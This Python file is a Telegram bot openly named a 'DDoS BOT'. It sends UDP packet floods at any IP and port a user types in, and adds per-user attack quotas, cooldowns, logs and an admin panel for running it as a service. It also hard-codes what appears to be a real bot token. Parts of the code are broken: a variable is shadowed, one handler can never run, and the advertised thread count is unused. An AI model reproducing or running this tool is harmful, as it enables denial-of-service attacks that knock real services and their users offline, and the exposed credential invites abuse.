import asyncio
import socket
import random
import time
import json
import os
import threading
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==================== CONFIGURATION ====================
BOT_TOKEN = "7149714912:AAGDJWGQqR0uPPxnQOw4dI9QaEGhlpnarN4"  # @BotFather se lo
OWNER_ID = 5879540185  # Apna Telegram ID
DATA_FILE = "users.json"
LOG_FILE = "attack_logs.json"

# Cooldown settings (seconds)
COOLDOWN_TIME = 30  # Users ke liye cooldown time
ADMIN_COOLDOWN = 10  # Admin ke liye cooldown time

# Attack settings
MAX_THREADS = 500
MAX_DURATION = 300
MIN_DURATION = 10

# ==================== DATA MANAGEMENT ====================
def load_data():
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": {}, "admins": [OWNER_ID], "cooldowns": {}}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def load_logs():
    try:
        with open(LOG_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_log(log):
    logs = load_logs()
    logs.append(log)
    # Keep last 1000 logs
    if len(logs) > 1000:
        logs = logs[-1000:]
    with open(LOG_FILE, 'w') as f:
        json.dump(logs, f, indent=4)

data = load_data()

# ==================== HELPER FUNCTIONS ====================
def is_admin(user_id):
    return user_id in data.get("admins", []) or user_id == OWNER_ID

def is_approved(user_id):
    if is_admin(user_id):
        return True
    return str(user_id) in data.get("users", {})

def add_user(user_id, username="", max_attacks=50):
    data["users"][str(user_id)] = {
        "username": username,
        "max_attacks": max_attacks,
        "attacks_used": 0,
        "added_at": time.time()
    }
    save_data(data)

def remove_user(user_id):
    if str(user_id) in data["users"]:
        del data["users"][str(user_id)]
        save_data(data)
        return True
    return False

def get_remaining_attacks(user_id):
    if is_admin(user_id):
        return 999999
    user_data = data["users"].get(str(user_id), {})
    max_attacks = user_data.get("max_attacks", 0)
    used = user_data.get("attacks_used", 0)
    return max_attacks - used

def increment_attack(user_id):
    if is_admin(user_id):
        return
    if str(user_id) in data["users"]:
        data["users"][str(user_id)]["attacks_used"] = data["users"][str(user_id)].get("attacks_used", 0) + 1
        save_data(data)

def check_cooldown(user_id):
    last_attack = data["cooldowns"].get(str(user_id), 0)
    cooldown = ADMIN_COOLDOWN if is_admin(user_id) else COOLDOWN_TIME
    remaining = cooldown - (time.time() - last_attack)
    if remaining > 0:
        return remaining
    return 0

def set_cooldown(user_id):
    data["cooldowns"][str(user_id)] = time.time()
    save_data(data)

# ==================== ATTACK ENGINE ====================
active_attacks = {}

def udp_flood(target_ip, target_port, duration, user_id, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payload = random._urandom(1024)
        end_time = time.time() + duration
        count = 0
        
        while time.time() < end_time:
            for _ in range(100):
                sock.sendto(payload, (target_ip, target_port))
                count += 1
            time.sleep(0.001)
        
        sock.close()
        return count
    except:
        return 0

def launch_attack(ip, port, duration, user_id, chat_id, username):
    attack_id = f"{user_id}_{int(time.time())}"
    
    def run():
        active_attacks[attack_id] = {"status": "running", "start": time.time(), "target": f"{ip}:{port}"}
        
        # Launch attack
        packets = udp_flood(ip, port, duration, user_id, attack_id)
        
        # Update attack count
        increment_attack(user_id)
        set_cooldown(user_id)
        
        # Update attack log
        log_entry = {
            "attack_id": attack_id,
            "user_id": user_id,
            "username": username,
            "target": f"{ip}:{port}",
            "duration": duration,
            "packets": packets,
            "timestamp": time.time(),
            "status": "completed"
        }
        save_log(log_entry)
        
        active_attacks[attack_id]["status"] = "completed"
        active_attacks[attack_id]["packets"] = packets
    
    thread = threading.Thread(target=run)
    thread.start()
    return attack_id

# ==================== TELEGRAM BOT ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized! Contact owner for access.")
        return
    
    keyboard = [
        [InlineKeyboardButton("🚀 Attack", callback_data="attack")],
        [InlineKeyboardButton("📊 Status", callback_data="status"), InlineKeyboardButton("👤 Profile", callback_data="profile")],
        [InlineKeyboardButton("📜 Logs", callback_data="logs"), InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])
    
    remaining = get_remaining_attacks(user_id)
    cooldown = check_cooldown(user_id)
    
    status_text = f"✅ Ready" if cooldown == 0 else f"⏳ Cooldown: {int(cooldown)}s"
    
    await update.message.reply_text(
        f"🔥 **DDoS BOT** 🔥\n\n"
        f"👤 User: @{username}\n"
        f"🎯 Attacks Left: {remaining}\n"
        f"⚡ Status: {status_text}\n\n"
        f"Use buttons below:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    remaining = get_remaining_attacks(user_id)
    if remaining <= 0 and not is_admin(user_id):
        await update.message.reply_text("❌ No attacks left! Contact admin to increase limit.")
        return
    
    cooldown = check_cooldown(user_id)
    if cooldown > 0:
        await update.message.reply_text(f"⏳ Please wait {int(cooldown)} seconds before next attack.")
        return
    
    context.user_data["step"] = "ip"
    await update.message.reply_text(
        "🎯 **Launch Attack**\n\n"
        "Step 1/3: Send target IP\n"
        "Example: `1.1.1.1`",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    text = update.message.text.strip()
    
    if not is_approved(user_id) and not is_admin(user_id):
        return
    
    if "step" not in context.user_data:
        return
    
    step = context.user_data["step"]
    
    if step == "ip":
        parts = text.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            await update.message.reply_text("❌ Invalid IP. Try again:")
            return
        context.user_data["ip"] = text
        context.user_data["step"] = "port"
        await update.message.reply_text("✅ IP saved\n\nStep 2/3: Send port (1-65535)\nExample: `80`")
    
    elif step == "port":
        try:
            port = int(text)
            if port < 1 or port > 65535:
                raise ValueError
            context.user_data["port"] = port
            context.user_data["step"] = "duration"
            await update.message.reply_text(f"✅ Port saved\n\nStep 3/3: Send duration ({MIN_DURATION}-{MAX_DURATION} seconds)\nExample: `60`")
        except:
            await update.message.reply_text("❌ Invalid port. Try again:")
    
    elif step == "duration":
        try:
            duration = int(text)
            if duration < MIN_DURATION or duration > MAX_DURATION:
                await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds")
                return
            
            ip = context.user_data["ip"]
            port = context.user_data["port"]
            
            await update.message.reply_text(
                f"🚀 **Launching Attack**\n\n"
                f"Target: `{ip}:{port}`\n"
                f"Duration: {duration}s\n"
                f"Threads: {MAX_THREADS}\n\n"
                f"Please wait...",
                parse_mode='Markdown'
            )
            
            attack_id = launch_attack(ip, port, duration, user_id, update.message.chat_id, username)
            
            await update.message.reply_text(
                f"✅ **Attack Launched!**\n\n"
                f"Target: `{ip}:{port}`\n"
                f"Duration: {duration}s\n"
                f"Attack ID: `{attack_id}`",
                parse_mode='Markdown'
            )
            
            context.user_data.clear()
            
        except ValueError:
            await update.message.reply_text("❌ Invalid duration. Try again:")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await query.message.edit_text("❌ Unauthorized!")
        return
    
    data = query.data
    
    if data == "attack":
        await attack_command(update, context)
    
    elif data == "status":
        if active_attacks:
            msg = "🔥 **Active Attacks**\n\n"
            for aid, att in list(active_attacks.items()):
                elapsed = int(time.time() - att["start"])
                msg += f"• `{aid}` - {att['target']} - {att['status']} ({elapsed}s)\n"
            await query.message.edit_text(msg, parse_mode='Markdown')
        else:
            await query.message.edit_text("✅ No active attacks")
    
    elif data == "profile":
        remaining = get_remaining_attacks(user_id)
        cooldown = check_cooldown(user_id)
        user_data = data["users"].get(str(user_id), {})
        used = user_data.get("attacks_used", 0)
        max_attacks = user_data.get("max_attacks", "Unlimited" if is_admin(user_id) else 0)
        
        msg = f"👤 **Your Profile**\n\n"
        msg += f"🆔 ID: `{user_id}`\n"
        msg += f"👑 Role: {'Admin' if is_admin(user_id) else 'User'}\n"
        msg += f"🎯 Attacks Used: {used}\n"
        msg += f"🎯 Attacks Left: {remaining}\n"
        msg += f"⏳ Cooldown: {int(cooldown)}s left" if cooldown > 0 else "✅ Ready to attack"
        await query.message.edit_text(msg, parse_mode='Markdown')
    
    elif data == "logs":
        logs = load_logs()
        recent = [log for log in logs if log.get("user_id") == user_id][-5:]
        if not recent:
            await query.message.edit_text("📜 No attack logs yet")
            return
        msg = "📜 **Recent Attacks**\n\n"
        for log in reversed(recent):
            timestamp = datetime.fromtimestamp(log.get("timestamp", time.time())).strftime("%H:%M:%S")
            msg += f"• `{log['target']}` - {log['duration']}s - {log.get('packets', 0)} packets [{timestamp}]\n"
        await query.message.edit_text(msg, parse_mode='Markdown')
    
    elif data == "help":
        msg = "❓ **Help**\n\n"
        msg += "🚀 `/attack` - Start attack\n"
        msg += "📊 `/status` - Active attacks\n"
        msg += "👤 `/profile` - Your stats\n"
        msg += "📜 `/logs` - Attack history\n\n"
        msg += "**Attack Process:**\n"
        msg += "1. `/attack`\n2. Enter IP\n3. Enter Port\n4. Enter Duration\n5. Done!"
        await query.message.edit_text(msg)
    
    elif data == "admin" and is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("➕ Add User", callback_data="admin_add")],
            [InlineKeyboardButton("➖ Remove User", callback_data="admin_remove")],
            [InlineKeyboardButton("📋 Users List", callback_data="admin_users")],
            [InlineKeyboardButton("⚙️ Set Limit", callback_data="admin_limit")],
            [InlineKeyboardButton("🔙 Back", callback_data="back")]
        ]
        await query.message.edit_text("👑 **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data == "admin_add" and is_admin(user_id):
        context.user_data["admin_action"] = "add_user"
        await query.message.edit_text("Send user ID and max attacks:\n`<user_id> <max_attacks>`\nExample: `123456789 50`")
    
    elif data == "admin_remove" and is_admin(user_id):
        context.user_data["admin_action"] = "remove_user"
        await query.message.edit_text("Send user ID to remove:\nExample: `123456789`")
    
    elif data == "admin_users" and is_admin(user_id):
        if not data["users"]:
            await query.message.edit_text("📭 No users added yet")
            return
        msg = "📋 **Users List**\n\n"
        for uid, udata in data["users"].items():
            username = udata.get("username", "N/A")
            used = udata.get("attacks_used", 0)
            max_atk = udata.get("max_attacks", 0)
            msg += f"• `{uid}` (@{username}) - {used}/{max_atk}\n"
        await query.message.edit_text(msg)
    
    elif data == "admin_limit" and is_admin(user_id):
        context.user_data["admin_action"] = "set_limit"
        await query.message.edit_text("Send user ID and new limit:\n`<user_id> <new_limit>`\nExample: `123456789 100`")
    
    elif data == "back":
        await start(update, context)

async def admin_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only!")
        return
    
    text = update.message.text.strip()
    action = context.user_data.get("admin_action")
    
    if action == "add_user":
        try:
            parts = text.split()
            target_id = int(parts[0])
            max_attacks = int(parts[1]) if len(parts) > 1 else 50
            username = (await context.bot.get_chat(target_id)).username or f"user_{target_id}"
            add_user(target_id, username, max_attacks)
            await update.message.reply_text(f"✅ User `{target_id}` added with {max_attacks} attacks limit")
        except:
            await update.message.reply_text("❌ Invalid format! Use: `user_id max_attacks`")
        context.user_data.pop("admin_action", None)
    
    elif action == "remove_user":
        try:
            target_id = int(text)
            if remove_user(target_id):
                await update.message.reply_text(f"✅ User `{target_id}` removed")
            else:
                await update.message.reply_text(f"❌ User `{target_id}` not found")
        except:
            await update.message.reply_text("❌ Invalid user ID")
        context.user_data.pop("admin_action", None)
    
    elif action == "set_limit":
        try:
            parts = text.split()
            target_id = int(parts[0])
            new_limit = int(parts[1])
            if str(target_id) in data["users"]:
                data["users"][str(target_id)]["max_attacks"] = new_limit
                save_data(data)
                await update.message.reply_text(f"✅ User `{target_id}` limit set to {new_limit}")
            else:
                await update.message.reply_text(f"❌ User `{target_id}` not found")
        except:
            await update.message.reply_text("❌ Invalid format! Use: `user_id new_limit`")
        context.user_data.pop("admin_action", None)

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_commands))
    
    print("=" * 50)
    print("🔥 DDoS BOT STARTED")
    print("=" * 50)
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"⚡ Cooldown: {COOLDOWN_TIME}s (user), {ADMIN_COOLDOWN}s (admin)")
    print(f"🎯 Max Duration: {MAX_DURATION}s")
    print(f"🧵 Threads: {MAX_THREADS}")
    print("=" * 50)
    
    app.run_polling()

if __name__ == "__main__":
    main()